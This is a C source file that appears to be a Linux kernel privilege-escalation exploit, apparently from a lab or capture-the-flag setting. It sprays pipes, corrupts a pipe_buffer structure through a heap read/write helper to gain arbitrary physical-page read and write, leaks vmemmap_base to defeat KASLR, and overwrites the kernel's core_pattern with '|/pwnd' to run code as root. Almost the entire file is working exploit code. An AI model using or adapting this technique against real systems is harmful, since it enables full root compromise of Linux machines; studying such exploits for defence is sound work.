#include "libs/pwn.h"

/*******************************
 * EXPLOIT                     *
 *******************************/

#define PIPE_SPRAY 0x80
#define PIPE_BUFFER SIZE

#define KASLR_GRANULARITY 0x10000000
#define KASLR_MASK (~(KASLR_GRANULARITY - 1))

#define PHYS2PAGE(x) (vmemmap_base + (x >> 6L))

static struct {
  u64 page;
  u32 offset, len;
  u64 ops;
  u32 flags;
  u64 private;
} pipe_buffer[0x10];

u64 vmemmap_base;
int *crpt_pipe = NULL;
void *pipe_buffer_ptr = NULL;
int pipe_buffer_off = 0;

void pipe_read(void *buf, sz len, u64 page) {
  ldebug("reading from page: 0x%lx", page);
  if (len > 0xfff)
    lerror("read length to long");

  pipe_buffer[pipe_buffer_off].len = 0x1000;
  pipe_buffer[pipe_buffer_off].offset = 0;
  pipe_buffer[pipe_buffer_off].page = page;

  keap_write(pipe_buffer_ptr, pipe_buffer, sizeof(pipe_buffer));

  SYSCHK(read(crpt_pipe[0], buf, len));

#ifdef DEBUG
  keap_read(pipe_buffer_ptr, pipe_buffer, sizeof(pipe_buffer));
  print_hex(pipe_buffer, sizeof(pipe_buffer));
#endif
}

void pipe_write(void *buf, sz len, u64 page) {
  ldebug("writing to page: 0x%lx", page);
  if (len > 0xfff)
    lerror("read length to long");

  pipe_buffer[pipe_buffer_off].len = 0;
  pipe_buffer[pipe_buffer_off].offset = 0;
  pipe_buffer[pipe_buffer_off].page = page;

  keap_write(pipe_buffer_ptr, pipe_buffer, sizeof(pipe_buffer));

  SYSCHK(write(crpt_pipe[1], buf, len));

#ifdef DEBUG
  keap_read(pipe_buffer_ptr, pipe_buffer, sizeof(pipe_buffer));
  print_hex(pipe_buffer, sizeof(pipe_buffer));
#endif
}

int main(int argc, char *argv[]) {
  lstage("INIT");

  init();
  rlimit_increase(RLIMIT_NOFILE);
  pin_cpu(0, 0);

  lstage("START");

  pipe_buffer_ptr = keap_malloc(sizeof(pipe_buffer), GFP_KERNEL_ACCOUNT);
  keap_free(pipe_buffer_ptr);

  int pipe_fds[PIPE_SPRAY][2];
  for (int i = 0; i < PIPE_SPRAY; i++)
    SYSCHK(pipe(pipe_fds[i]));

  for (long i = 1; i <= PIPE_SPRAY; i++)
    SYSCHK(write(pipe_fds[i - 1][1], &i, sizeof(i)));

  keap_read(pipe_buffer_ptr, pipe_buffer, sizeof(pipe_buffer));
  print_hex(pipe_buffer, sizeof(pipe_buffer));
  u64 page = pipe_buffer[pipe_buffer_off].page;
  vmemmap_base = page & KASLR_MASK;

  lhex(vmemmap_base);

  pipe_buffer[pipe_buffer_off].page = vmemmap_base + 0x9c * 0x40;
  pipe_buffer[pipe_buffer_off].len = 0x1000;

  keap_write(pipe_buffer_ptr, pipe_buffer, sizeof(pipe_buffer));

  linfo("find crpted pipe");
  u64 leak, physbase;
  for (long i = 1; i <= PIPE_SPRAY; i++) {
    SYSCHK(read(pipe_fds[i - 1][0], &leak, sizeof(leak)));
    if (leak != i) {
      crpt_pipe = pipe_fds[i - 1];
      physbase = leak & ~0xfff;
      linfo("corrupt pipe: %ld", i - 1);
      lhex(physbase);
      break;
    }
  }
  if (crpt_pipe == NULL)
    lerror("failed to find crpt pipe");

  u64 core_pattern_phys = physbase + (physbase == 0x2801000 ? 0x3000 : 0) - 0x94f000;
  u64 core_pattern_off = 0x380;
  lhex(core_pattern_phys);

  char buf[0xfff];
  pipe_read(buf, sizeof(buf), PHYS2PAGE(core_pattern_phys));
  char *core_pattern = buf + core_pattern_off;
  linfo("core_pattern: %s", core_pattern);
  strcpy(core_pattern, "|/pwnd");

  pipe_write(buf, sizeof(buf), PHYS2PAGE(core_pattern_phys));

  int core_pattern_fd = SYSCHK(open("/proc/sys/kernel/core_pattern", O_RDONLY));
  char core_pattern_buf[0x40];
  core_pattern_buf[SYSCHK(read(core_pattern_fd, core_pattern_buf,
                               sizeof(core_pattern_buf) - 1))] = 0;
  close(core_pattern_fd);
  linfo("/proc/sys/kernel/core_pattern: %s", core_pattern_buf);

  // recover
  pipe_read(&leak, sizeof(leak), page);

  return 0;
}
